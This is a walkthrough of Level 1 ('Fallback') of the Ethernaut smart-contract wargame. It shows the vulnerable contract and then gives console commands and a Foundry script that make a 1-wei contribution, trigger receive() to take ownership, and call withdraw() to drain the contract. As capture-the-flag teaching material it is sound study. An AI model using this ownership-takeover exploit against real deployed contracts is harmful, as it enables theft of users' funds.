# [Ethernaut 01 – Fallback walkthrough (YouTube)](https://www.youtube.com/watch?v=TQKj2xvsGec)

Here’s a detailed walkthrough for the Ethernaut **Fallback** challenge—Level 1. The goal is to **take control of the contract** and **drain its ETH** by exploiting its fallback logic.

---

## Contract Overview

Key parts of the `Fallback.sol` contract:

```solidity
mapping(address => uint) public contributions;
address public owner;

function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}

receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}

function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
}
```

* **Goal**: Become the owner, then call `withdraw()` to empty the contract. ([medium.com][1])
* **Owner changes options**:

    1. Via `contribute()`: only if your contribution exceeds the current owner's (impractical here). ([medium.com][1], [coinsbench.com][2])
    2. Via `receive()`: triggered when sending ETH directly, but **only if** you already have a contribution > 0. ([dev.to][3])

---

## Exploit Steps (Using Browser Console)

1. **Check current owner** (optional):

     ```js
     await contract.owner()
     ```

2. **Make a small contribution** (< 0.001 ETH) to register yourself:

     ```js
     await contract.contribute({ value: "1" }) // 1 wei is enough
     ```

     This satisfies the `contributions[msg.sender] > 0` requirement. ([dev.to][4])

3. **Trigger the fallback**

     ```js
     await contract.sendTransaction({ value: "1" })
     ```

     This invokes the `receive()` function with no data, passing the existing-contribution check and reassigning ownership to you. ([dev.to][4], [gist.github.com][5])

4. **Verify ownership**:

     ```js
     await contract.owner()
     ```

     Should now return your address.

5. **Withdraw all ETH**:

     ```js
     await contract.withdraw()
     ```

     As owner, you can successfully drain the entire balance.

---

## 🛠️ Alternative: Using Foundry Script

Setting up a script can automate the process:

```solidity
fallbackInstance.contribute{ value: 1 wei }();
address(fallbackInstance).call{ value: 1 wei }("");
fallbackInstance.withdraw();
```

🎯 This confirms you become owner and withdraw funds. ([gist.github.com][5], [coinsbench.com][2], [coinsbench.com][6])

---

## Final Summary

* **Contribute a tiny amount** via `contribute()` to satisfy the receive() requirement.
* **Trigger the fallback** by sending ETH directly to the contract address.
* **Ownership changes** to you.
* **Withdraw** all ETH using `withdraw()`.
* **Submit** the instance to complete the challenge.

---